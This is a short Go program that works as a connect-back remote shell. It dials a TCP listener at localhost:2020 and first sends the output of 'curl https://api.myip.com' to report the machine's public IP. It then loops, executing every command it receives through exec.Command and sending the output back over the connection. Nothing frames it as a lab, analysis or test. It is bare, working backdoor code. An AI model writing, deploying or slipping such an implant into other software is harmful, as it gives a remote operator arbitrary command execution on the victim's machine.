
package main

import (
	"net"
	"os/exec"
	"fmt"
	"strings"
)


func sendResponse(conn net.Conn, command string) {
	var response string
	split := strings.Split(command, " ")
	root := split[0]

	cmd := exec.Command(root, split[1:]...)
	output, err := cmd.Output()
	if err != nil {
		response = fmt.Sprintf("%s", err)
	} else {
		response = string(output)
	}
	fmt.Fprintf(conn, response)
}


func main() {
	req, err := net.Dial("tcp", "localhost:2020")
	if err != nil {
		return 
	}
	sendResponse(req, "curl https://api.myip.com")
	for {
		buf := make([]byte, 8192)
		read, err := req.Read(buf)
		if err != nil {
			continue
		}
		command := string(buf[:read])
		sendResponse(req, command)
	}
}